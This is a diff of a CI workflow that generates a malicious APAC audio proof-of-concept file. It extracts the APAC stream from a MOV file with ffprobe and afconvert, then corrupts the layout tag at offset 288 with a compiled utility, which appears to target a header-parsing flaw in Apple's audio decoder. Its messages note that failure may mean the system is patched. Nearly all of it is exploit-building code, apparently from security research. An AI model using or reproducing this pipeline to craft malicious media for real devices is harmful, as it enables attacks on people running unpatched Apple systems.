@@ -19,7 +19,7 @@ jobs:
       - name: Navigate to working directory
         run: cd AppleTest2/apple-positional-audio-codec-invalid-header-main && ls -l
 
-      # New: This script is now a simple utility to corrupt a file at a specific offset.
+      # This script is a simple utility to corrupt a file at a specific offset.
       - name: Patch encodeme.mm to be a Simple File Corruptor
         working-directory: AppleTest2/apple-positional-audio-codec-invalid-header-main
         run: |
@@ -71,22 +71,18 @@ jobs:
           clang++ -g -fobjc-arc -framework Foundation encodeme.mm -o encodeme_corruptor
           if [ $? -ne 0 ]; then echo "Compilation failed."; exit 1; fi
 
-      # This step now uses professional tools to find the audio track and create a clean APAC file before corrupting it.
+      # This step now uses ffprobe to find the correct stream and afconvert to extract it before corrupting.
       - name: Surgically Corrupt APAC File
         working-directory: AppleTest2/apple-positional-audio-codec-invalid-header-main
         run: |
-          set -x # Print each command before executing it for easier debugging
+          set -x 
           
           echo "Installing ffmpeg to handle media files..."
           brew install ffmpeg
 
-          # Step 1: Use ffprobe to identify the APAC audio stream from the original MOV file.
-          echo "--- Dumping full ffprobe stream info to find the correct codec name... ---"
-          ffprobe -v error -show_format -show_streams IMG_1027.mov
-          echo "--------------------------------------------------------------------------"
-
-          # We use grep and cut to extract the stream index. This may fail, but the log above will show us why.
-          APAC_STREAM_INDEX=$(ffprobe -v error -show_entries stream=index,codec_name -select_streams a -of default=noprint_wrappers=1:nokey=1 IMG_1027.mov | grep 'apac' -B 1 | head -n 1)
+          # Step 1: Use ffprobe to find the stream index for the 'apac' codec TAG.
+          # The -show_entries stream=index,codec_tag_string is key.
+          APAC_STREAM_INDEX=$(ffprobe -v error -show_entries stream=index,codec_tag_string -select_streams a -of default=noprint_wrappers=1:nokey=1 IMG_1027.mov | grep 'apac' -B 1 | head -n 1)
 
           if [ -z "$APAC_STREAM_INDEX" ]; then
             echo "Could not find an APAC audio stream in the MOV file. Aborting."
@@ -95,11 +91,11 @@ jobs:
 
           echo "Found APAC audio in stream index: ${APAC_STREAM_INDEX}"
           
-          # Step 2: Use afconvert to extract and create a clean, standalone APAC audio file.
+          # Step 2: Use afconvert to extract the APAC stream into a clean M4A file.
           afconvert -i IMG_1027.mov -o output_apac_clean.m4a -d apac -f mp4f --stream ${APAC_STREAM_INDEX}
 
           if [ $? -ne 0 ]; then
-              echo "afconvert failed to create a clean APAC file."
+              echo "afconvert failed to create a clean APAC file. This may mean the system version is patched."
               exit 1
           fi
 
@@ -107,7 +103,8 @@ jobs:
           cp output_apac_clean.m4a output_apac_poc.m4a
 
           # Step 3: Run the C++ utility to perform the corruption.
-          CORRUPTION_OFFSET=288 # A common offset for the layout tag in clean afconvert files.
+          # For a clean file created with afconvert, the offset is much more predictable.
+          CORRUPTION_OFFSET=288 
           ./encodeme_corruptor output_apac_poc.m4a $CORRUPTION_OFFSET
           
           echo "Malicious APAC PoC file generated."
